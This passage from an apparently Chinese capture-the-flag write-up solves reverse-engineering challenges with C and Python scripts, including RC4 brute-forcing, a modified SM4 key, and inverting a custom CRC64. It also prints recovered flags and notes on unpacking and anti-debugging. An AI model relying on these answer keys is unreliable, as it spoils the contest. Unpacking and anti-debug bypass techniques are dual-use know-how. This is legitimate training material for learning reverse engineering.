class="type">char</span> box[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x35</span>, <span class="number">0xF1</span>, <span class="number">0xDA</span>, <span class="number">0x19</span>, <span class="number">0x7A</span>, <span class="number">0xF6</span>, <span class="number">0x31</span>, <span class="number">0x9C</span>, <span class="number">0xD9</span>, <span class="number">0x2C</span>,</span><br><span class="line">  <span class="number">0xC1</span>, <span class="number">0xFC</span>, <span class="number">0xE2</span>, <span class="number">0xD8</span>, <span class="number">0x1D</span>, <span class="number">0x8D</span>, <span class="number">0x4F</span>, <span class="number">0x97</span>, <span class="number">0x81</span>, <span class="number">0x26</span>,</span><br><span class="line">  <span class="number">0xC0</span>, <span class="number">0xB8</span>, <span class="number">0x96</span>, <span class="number">0x27</span>, <span class="number">0xD5</span>, <span class="number">0x5B</span>, <span class="number">0xAA</span>, <span class="number">0x18</span>, <span class="number">0x85</span>, <span class="number">0xFA</span>,</span><br><span class="line">  <span class="number">0x61</span>, <span class="number">0xE4</span>, <span class="number">0xA1</span>, <span class="number">0xBC</span>, <span class="number">0xF8</span>, <span class="number">0xA4</span>, <span class="number">0x56</span>, <span class="number">0x37</span>, <span class="number">0x43</span>, <span class="number">0x58</span>,</span><br><span class="line">  <span class="number">0x2B</span>, <span class="number">0xC9</span>, <span class="number">0x77</span>, <span class="number">0x64</span>, <span class="number">0xCC</span>, <span class="number">0x6B</span>, <span class="number">0x98</span>, <span class="number">0x65</span>, <span class="number">0x75</span>, <span class="number">0x38</span>,</span><br><span class="line">  <span class="number">0x80</span>, <span class="number">0x09</span>, <span class="number">0x11</span>, <span class="number">0x3D</span>, <span class="number">0xD0</span>, <span class="number">0xE6</span>, <span class="number">0x8F</span>, <span class="number">0xA9</span>, <span class="number">0x57</span>, <span class="number">0x99</span>,</span><br><span class="line">  <span class="number">0x06</span>, <span class="number">0x10</span>, <span class="number">0x5D</span>, <span class="number">0xC5</span>, <span class="number">0x69</span>, <span class="number">0xBD</span>, <span class="number">0x2D</span>, <span class="number">0x68</span>, <span class="number">0x7E</span>, <span class="number">0xE3</span>,</span><br><span class="line">  <span class="number">0x67</span>, <span class="number">0xD1</span>, <span class="number">0xFF</span>, <span class="number">0x5E</span>, <span class="number">0xF9</span>, <span class="number">0xF5</span>, <span class="number">0x41</span>, <span class="number">0x8C</span>, <span class="number">0xDD</span>, <span class="number">0x21</span>,</span><br><span class="line">  <span class="number">0x4B</span>, <span class="number">0xA7</span>, <span class="number">0x47</span>, <span class="number">0x86</span>, <span class="number">0x6D</span>, <span class="number">0xC3</span>, <span class="number">0x2A</span>, <span class="number">0x9A</span>, <span class="number">0x9F</span>, <span class="number">0x20</span>,</span><br><span class="line">  <span class="number">0x48</span>, <span class="number">0xBB</span>, <span class="number">0x94</span>, <span class="number">0xB9</span>, <span class="number">0xB4</span>, <span class="number">0x92</span>, <span class="number">0x02</span>, <span class="number">0x74</span>, <span class="number">0x7D</span>, <span class="number">0x1B</span>,</span><br><span class="line">  <span class="number">0x1E</span>, <span class="number">0x5F</span>, <span class="number">0xBA</span>, <span class="number">0x49</span>, <span class="number">0xD6</span>, <span class="number">0xE7</span>, <span class="number">0x53</span>, <span class="number">0x04</span>, <span class="number">0xCB</span>, <span class="number">0x28</span>,</span><br><span class="line">  <span class="number">0x3F</span>, <span class="number">0xE8</span>, <span class="number">0x33</span>, <span class="number">0x3E</span>, <span class="number">0x00</span>, <span class="number">0x9B</span>, <span class="number">0x6A</span>, <span class="number">0xFD</span>, <span class="number">0xBE</span>, <span class="number">0x1C</span>,</span><br><span class="line">  <span class="number">0x90</span>, <span class="number">0xED</span>, <span class="number">0xDF</span>, <span class="number">0x4D</span>, <span class="number">0x25</span>, <span class="number">0x6F</span>, <span class="number">0xB5</span>, <span class="number">0x13</span>, <span class="number">0x70</span>, <span class="number">0x3C</span>,</span><br><span class="line">  <span class="number">0x9E</span>, <span class="number">0x16</span>, <span class="number">0x0C</span>, <span class="number">0x05</span>, <span class="number">0x4A</span>, <span class="number">0x73</span>, <span class="number">0xDE</span>, <span class="number">0xB1</span>, <span class="number">0x8A</span>, <span class="number">0x51</span>,</span><br><span class="line">  <span class="number">0x3B</span>, <span class="number">0x54</span>, <span class="number">0x14</span>, <span class="number">0xE0</span>, <span class="number">0x5A</span>, <span class="number">0xDC</span>, <span class="number">0x91</span>, <span class="number">0x62</span>, <span class="number">0xA3</span>, <span class="number">0x95</span>,</span><br><span class="line">  <span class="number">0xD3</span>, <span class="number">0x3A</span>, <span class="number">0x17</span>, <span class="number">0xEE</span>, <span class="number">0x32</span>, <span class="number">0xF2</span>, <span class="number">0x7C</span>, <span class="number">0xAF</span>, <span class="number">0xB3</span>, <span class="number">0x88</span>,</span><br><span class="line">  <span class="number">0xEC</span>, <span class="number">0x0E</span>, <span class="number">0xAE</span>, <span class="number">0x9D</span>, <span class="number">0x5C</span>, <span class="number">0x0D</span>, <span class="number">0x55</span>, <span class="number">0x4E</span>, <span class="number">0xFB</span>, <span class="number">0x46</span>,</span><br><span class="line">  <span class="number">0x22</span>, <span class="number">0x44</span>, <span class="number">0x45</span>, <span class="number">0xBF</span>, <span class="number">0x52</span>, <span class="number">0x12</span>, <span class="number">0x66</span>, <span class="number">0x07</span>, <span class="number">0xD2</span>, <span class="number">0x36</span>,</span><br><span class="line">  <span class="number">0x93</span>, <span class="number">0x6E</span>, <span class="number">0x42</span>, <span class="number">0x1A</span>, <span class="number">0x0F</span>, <span class="number">0xE9</span>, <span class="number">0x60</span>, <span class="number">0xCA</span>, <span class="number">0xB2</span>, <span class="number">0x6C</span>,</span><br><span class="line">  <span class="number">0x83</span>, <span class="number">0xF0</span>, <span class="number">0x03</span>, <span class="number">0x76</span>, <span class="number">0xA8</span>, <span class="number">0x1F</span>, <span class="number">0x63</span>, <span class="number">0xEF</span>, <span class="number">0xA5</span>, <span class="number">0xCD</span>,</span><br><span class="line">  <span class="number">0x79</span>, <span class="number">0x7B</span>, <span class="number">0x0A</span>, <span class="number">0x0B</span>, <span class="number">0xAB</span>, <span class="number">0xDB</span>, <span class="number">0xD4</span>, <span class="number">0x7F</span>, <span class="number">0x01</span>, <span class="number">0x34</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x59</span>, <span class="number">0xE1</span>, <span class="number">0x29</span>, <span class="number">0xC6</span>, <span class="number">0xAC</span>, <span class="number">0xA2</span>, <span class="number">0x40</span>, <span class="number">0xC8</span>, <span class="number">0xAD</span>,</span><br><span class="line">  <span class="number">0xC4</span>, <span class="number">0x89</span>, <span class="number">0xC2</span>, <span class="number">0xB6</span>, <span class="number">0x71</span>, <span class="number">0xA0</span>, <span class="number">0xEB</span>, <span class="number">0x2F</span>, <span class="number">0x78</span>, <span class="number">0xF3</span>,</span><br><span class="line">  <span class="number">0xB0</span>, <span class="number">0xFE</span>, <span class="number">0xCE</span>, <span class="number">0xF7</span>, <span class="number">0x84</span>, <span class="number">0x72</span>, <span class="number">0xF4</span>, <span class="number">0xCF</span>, <span class="number">0xC7</span>, <span class="number">0xD7</span>,</span><br><span class="line">  <span class="number">0xB7</span>, <span class="number">0x8E</span>, <span class="number">0x4C</span>, <span class="number">0x82</span>, <span class="number">0x30</span>, <span class="number">0x50</span>, <span class="number">0x2E</span>, <span class="number">0x24</span>, <span class="number">0x87</span>, <span class="number">0x08</span>,</span><br><span class="line">  <span class="number">0x39</span>, <span class="number">0xE5</span>, <span class="number">0xEA</span>, <span class="number">0xA6</span>, <span class="number">0x8B</span>, <span class="number">0x15</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对输入进行处理的字符串 Str2_0</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> Str2_0[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x35</span>, <span class="number">0x6D</span>, <span class="number">0x35</span>, <span class="number">0x64</span>, <span class="number">0x35</span>, <span class="number">0x77</span>, <span class="number">0x35</span>, <span class="number">0x64</span>, <span class="number">0x35</span>, <span class="number">0x62</span>,</span><br><span class="line">  <span class="number">0x35</span>, <span class="number">0x6E</span>, <span class="number">0x35</span>, <span class="number">0x6D</span>, <span class="number">0x35</span>, <span class="number">0x64</span>, <span class="number">0x35</span>, <span class="number">0x77</span>, <span class="number">0x35</span>, <span class="number">0x64</span>,</span><br><span class="line">  <span class="number">0x35</span>, <span class="number">0x62</span>, <span class="number">0x35</span>, <span class="number">0x6E</span>, <span class="number">0x35</span>, <span class="number">0x6D</span>, <span class="number">0x35</span>, <span class="number">0x64</span>, <span class="number">0x35</span>, <span class="number">0x77</span>,</span><br><span class="line">  <span class="number">0x35</span>, <span class="number">0x64</span>, <span class="number">0x35</span>, <span class="number">0x62</span>, <span class="number">0x35</span>, <span class="number">0x6E</span>, <span class="number">0x8E</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理后的 tmpStr</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> tmpStr[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x38</span>, <span class="number">0x9A</span>, <span class="number">0xFA</span>, <span class="number">0xC3</span>, <span class="number">0x5B</span>, <span class="number">0x89</span>, <span class="number">0xA5</span>, <span class="number">0xE6</span>, <span class="number">0xD0</span>, <span class="number">0xAB</span>,</span><br><span class="line">  <span class="number">0x42</span>, <span class="number">0x58</span>, <span class="number">0x57</span>, <span class="number">0x09</span>, <span class="number">0x42</span>, <span class="number">0xAB</span>, <span class="number">0x33</span>, <span class="number">0x2F</span>, <span class="number">0x98</span>, <span class="number">0x42</span>,</span><br><span class="line">  <span class="number">0x2E</span>, <span class="number">0x59</span>, <span class="number">0x6D</span>, <span class="number">0x41</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理前的 tmpStr</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> tmpstr[] = <span class="string">&quot;+i&amp;[@Y:g8[&amp;l$f8S8v$Y&amp;e&gt;&#123;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加密函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">rc4_crypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* box, <span class="type">unsigned</span> <span class="type">char</span>* data, <span class="type">unsigned</span> <span class="type">long</span> datalen)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, t = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; datalen; k++)</span><br><span class="line">    &#123;</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span>;</span><br><span class="line">        tmp = box[i];</span><br><span class="line">        box[i] = box[j];</span><br><span class="line">        box[j] = tmp;</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span>;</span><br><span class="line">        data[k] ^= box[t];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> flag[<span class="number">30</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 先备份一份 box</span></span><br><span class="line">    <span class="built_in">memcpy</span>(box3,box,<span class="number">256</span>);</span><br><span class="line">    <span class="type">int</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> v1, v2, v3;</span><br><span class="line">    <span class="type">int</span> v11, v21, v31;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        v1 = v2 = v3 = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">memcpy</span>(box3, box, <span class="number">256</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>((<span class="type">char</span>*)tmpStr); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (flag[i] != <span class="number">0</span>)                           <span class="comment">// 先根据flag的内容来</span></span><br><span class="line">            &#123;</span><br><span class="line">                v1 = (v1 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">                v2 = (v2 + box3[v1]) % <span class="number">256</span>;</span><br><span class="line">                tmp = box3[v1];</span><br><span class="line">                box3[v1] = box3[v2];</span><br><span class="line">                box3[v2] = tmp;</span><br><span class="line">                v3 = (box3[v1] + box3[v2]) % <span class="number">256</span>;</span><br><span class="line">                <span class="comment">//tmpstr[i] ^= box3[v3];</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>                                        <span class="comment">// 爆破</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//先保存上一次正确的 v1、v2、v3</span></span><br><span class="line">                v11 = v1;</span><br><span class="line">                v21 = v2;</span><br><span class="line">                v31 = v3;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">char</span> j = <span class="number">32</span>; j &lt; <span class="number">127</span>; j++)</span><br><span class="line">                &#123;</span><br><span class="line">                    k = j + Str2_0[i] - <span class="number">112</span>;</span><br><span class="line">                    <span class="built_in">memcpy</span>(box4, box3, <span class="number">256</span>);</span><br><span class="line">                    v1 = v11;</span><br><span class="line">                    v2 = v21;</span><br><span class="line">                    v3 = v31;</span><br><span class="line"></span><br><span class="line">                    v1 = (v1 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">                    v2 = (v2 + box4[v1]) % <span class="number">256</span>;</span><br><span class="line">                    tmp = box4[v1];</span><br><span class="line">                    box4[v1] = box4[v2];</span><br><span class="line">                    box4[v2] = tmp;</span><br><span class="line">                    v3 = (box4[v1] + box4[v2]) % <span class="number">256</span>;</span><br><span class="line">                    k ^= box4[v3];</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (k == tmpStr[i])</span><br><span class="line">                    &#123;</span><br><span class="line">                        flag[i] = j;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strlen</span>((<span class="type">char</span>*)flag) == <span class="built_in">strlen</span>((<span class="type">char</span>*)tmpStr))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; flag &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    func();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="rc4逆向"><a href="#rc4逆向" class="headerlink" title="rc4逆向"></a>rc4逆向</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">t = <span class="string">b&quot;5m5d5w5d5b5n5m5d5w5d5b5n5m5d5w5d5b5n\x8e&quot;</span></span><br><span class="line"><span class="comment"># tmp[i] = flag[i] + t[i]-112</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher.ARC4 <span class="keyword">import</span> *</span><br><span class="line">enc = <span class="built_in">bytes</span>([<span class="number">0x38</span>, <span class="number">0x9A</span>, <span class="number">0xFA</span>, <span class="number">0xC3</span>, <span class="number">0x5B</span>, <span class="number">0x89</span>, <span class="number">0xA5</span>, <span class="number">0xE6</span>, <span class="number">0xD0</span>, <span class="number">0xAB</span>, <span class="number">0x42</span>, <span class="number">0x58</span>, <span class="number">0x57</span>, <span class="number">0x09</span>, <span class="number">0x42</span>, <span class="number">0xAB</span>, <span class="number">0x33</span>, <span class="number">0x2F</span>, <span class="number">0x98</span>, <span class="number">0x42</span>, <span class="number">0x2E</span>, <span class="number">0x59</span>, <span class="number">0x6D</span>, <span class="number">0x41</span>])</span><br><span class="line">rc4 = new(t)</span><br><span class="line">p = rc4.decrypt(enc)</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line">p = <span class="built_in">list</span>(p)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(p)):</span><br><span class="line">    p[i] = (p[i]+<span class="number">112</span>-t[i])&amp;<span class="number">0xff</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(p))</span><br></pre></td></tr></table></figure><h4 id="不经过rc4"><a href="#不经过rc4" class="headerlink" title="不经过rc4"></a>不经过rc4</h4><p>对box进行交叉引用可以发现，box和box2其实是相同的</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240208000241839.png" alt="image-20240208000241839"></p><p>那么rc4加密在使用相同box的前提下，想要得到的密文相同，就必须保证明文在进行rc4加密之前就是相同的，即key和temStr在加密前就是相同的。</p><p>这样我们就可以简化成如下步骤：</p><p>key &#x3D; 用户输入 + str2_0 - 112</p><p>temStr &#x3D; +i&amp;[@Y:g8[&amp;l$f8S8v$Y&amp;e&gt;{</p><p>str2_0 &#x3D; unk_6C8E68 - 114</p><p>unk_6C8E68就是俄文单词нечего重复3次</p><blockquote><p>几个问答全都没用，看中间关键的几个加密函数</p><p>中间涉及到rc4，但是最后用于比对的key2和str1经过同一个S盒的RC4加密，等于没加密</p><p>几个长得像key的几个字符串是有用的，排除干扰之后逻辑非常简单</p><p><a href="http://t.csdnimg.cn/QKP71">http://t.csdnimg.cn/QKP71</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">char</span> rus[<span class="number">38</span>] = <span class="string">&quot;нечегонечегонечего&quot;</span>;<span class="comment">//37</span></span><br><span class="line">    <span class="type">char</span> key2[<span class="number">26</span>] = <span class="string">&quot;+i&amp;[@Y:g8[&amp;l$f8S8v$Y&amp;e&gt;&#123;&quot;</span>;<span class="comment">//25</span></span><br><span class="line">    <span class="type">char</span> key1[<span class="number">38</span>] = &#123; <span class="number">0</span> &#125;;<span class="comment">//37</span></span><br><span class="line">    <span class="type">char</span> flag[<span class="number">26</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="built_in">strlen</span>(rus); ++i)</span><br><span class="line">        key1[i] = rus[i] - <span class="number">114</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s   %d&quot;</span>, key1, <span class="built_in">strlen</span>(key1));<span class="comment">//5m5d5w5d5b5n5m5d5w5d5b5n5m5d5w5d5b5n 37</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="built_in">strlen</span>(key2); ++i)</span><br><span class="line">        flag[i] = key2[i] - key1[i] + <span class="number">112</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, flag);<span class="comment">//flag&#123;Russian_is_so_easy&#125;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><h3 id="Ezpython"><a href="#Ezpython" class="headerlink" title="Ezpython"></a>Ezpython</h3><h4 id="考点：sm4，python"><a href="#考点：sm4，python" class="headerlink" title="考点：sm4，python"></a>考点：sm4，python</h4><p>pyinstaller打包python生成的exe</p><p>pyinstxtractor工具拆包—ezpython.exe_extracted</p><p>里面找到ezpython.pyc文件，使用uncompyle6 反编译出源码</p><p>uncompyle6.exe .\ezpython.pyc</p><p>SM4加密</p><p>寻找密文和key进行解密</p><p>由于编码问题，使用uncompyle6.exe .\ezpython.pyc &gt; ezpython.py会出现报错</p><p>于是将上述反编译出的源码贴进一个自己新建的ezpython.py文件中，把这个文件放进ezpython.exe_extracted文件里，用vscode打开这个文件夹</p><p>为了得到key和enc</p><p>需要在文件夹里面找到secret.pyc，然后对其进行反编译</p><p>uncompyle6.exe .\secret.pyc &gt; .\secret.py</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">key = &#x27;BeginCTFBeginCTF&#x27;</span><br><span class="line">enc = </span><br><span class="line">b&#x27;JmjJEAJGMT6F9bmC+Vyxy8Z1lpfaJzdEX6BGG/qgqUjUpQaYSON1CnZyX9YXTEClSRYm7PFZtGxmJw6LPuw1ww==&#x27;</span><br></pre></td></tr></table></figure><p>但是赛博厨子求不出，猜测魔改sm4算法</p><p>ezpython.py中导入了sm4库，于是将文件夹内的sm4.pyc进行反编译</p><p>uncompyle6.exe .\sm4.pyc &gt; sm4.py</p><p>根据题目提示，魔改可能与密钥相关，于是直接查找key</p><p>容易发现CryptSM4类下的set_key方法存在魔改</p><p>将原始key值异或了37</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240208001132113.png" alt="image-20240208001132113"></p><h3 id="出题人的密码是什么"><a href="#出题人的密码是什么" class="headerlink" title="出题人的密码是什么"></a>出题人的密码是什么</h3><p>#花指令</p><p>恢复main函数逻辑</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240208001311389.png" alt="image-20240208001311389"></p><p>主要加密是一个魔改crc64</p><p>通过和零比较，从而进行不同的加密，实际上是比较的最高位</p><p>看密文最低位，根据最低位，判断这个数在加密前最高位是1还是0</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="number">0x33077d</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">value, key</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        <span class="keyword">if</span> value &amp; <span class="number">1</span>:</span><br><span class="line">            value = (value ^ key) &gt;&gt; <span class="number">1</span></span><br><span class="line">            value |= <span class="number">0x8000000000000000</span>  <span class="comment">#还原最高位</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            value = value &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line">out = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;B4BBD8EBD06EABCA658E4BE94DD44AF37D29C2F99589A4859DCDDF77FD45CB5D7DFD934BBCF67CF32442F5D2DDE356AE&#x27;</span>)</span><br><span class="line">out = [((i ^ <span class="number">0x25</span>) - <span class="number">5</span>) &amp; <span class="number">0xff</span> <span class="keyword">for</span> i <span class="keyword">in</span> out]</span><br><span class="line"><span class="built_in">print</span>(out)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(out), <span class="number">8</span>):</span><br><span class="line">    v = <span class="built_in">int</span>.from_bytes(out[i: i + <span class="number">8</span>], <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    flag += decrypt(v, key).to_bytes(<span class="number">8</span>, <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag.decode())</span><br></pre></td></tr></table></figure><p>同时这个题目里面还有简单的时间反调试</p><h3 id="Arc（没学过的（会学的"><a href="#Arc（没学过的（会学的" class="headerlink" title="Arc（没学过的（会学的"></a><strong>Arc</strong>（没学过的（会学的</h3><h4 id="z3-考点：单字节爆破，混淆"><a href="#z3-考点：单字节爆破，混淆" class="headerlink" title="z3?考点：单字节爆破，混淆"></a>z3?<strong>考点：单字节爆破，混淆</strong></h4><h3 id="Not-main"><a href="#Not-main" class="headerlink" title="Not main"></a>Not main</h3><h4 id="考点：TEA，XXTEA，VEH异常处理，反调试"><a href="#考点：TEA，XXTEA，VEH异常处理，反调试" class="headerlink" title="考点：TEA，XXTEA，VEH异常处理，反调试"></a>考点：TEA，XXTEA，VEH异常处理，反调试</h4><h4 id="veh反调试，全局变量初始化init（没学，继续"><a href="#veh反调试，全局变量初始化init（没学，继续" class="headerlink" title="veh反调试，全局变量初始化init（没学，继续"></a>veh反调试，全局变量初始化init（没学，继续</h4><h3 id="EZVM（不太会"><a href="#EZVM（不太会" class="headerlink" title="EZVM（不太会"></a>EZVM（不太会</h3><p>vm题 c++</p><h3 id="Goforfun（不会"><a href="#Goforfun（不会" class="headerlink" title="Goforfun（不会"></a>Goforfun（不会</h3><h4 id="考点：go语言，rc4魔改，单字节爆破"><a href="#考点：go语言，rc4魔改，单字节爆破" class="headerlink" title="考点：go语言，rc4魔改，单字节爆破"></a>考点：go语言，rc4魔改，单字节爆破</h4><p>go语言编写的程序，go 1.21</p><p>可以装一个idagolanghelper插件帮助恢复符号表</p><p>恢复之后确定主函数就需要动调</p><h3 id="Babyvm（不太会，留着"><a href="#Babyvm（不太会，留着" class="headerlink" title="Babyvm（不太会，留着"></a>Babyvm（不太会，留着</h3><h4 id="考点：vm，二进制文件读写，z3"><a href="#考点：vm，二进制文件读写，z3" class="headerlink" title="考点：vm，二进制文件读写，z3"></a>考点：vm，二进制文件读写，z3</h4><p>主程序逻辑不难，难点在如何批量处理指令和数据，附上打印汇编语言的脚本</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;D:\opcode.vm&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">  bincode= <span class="built_in">list</span>(file.read())</span><br><span class="line">opcode= 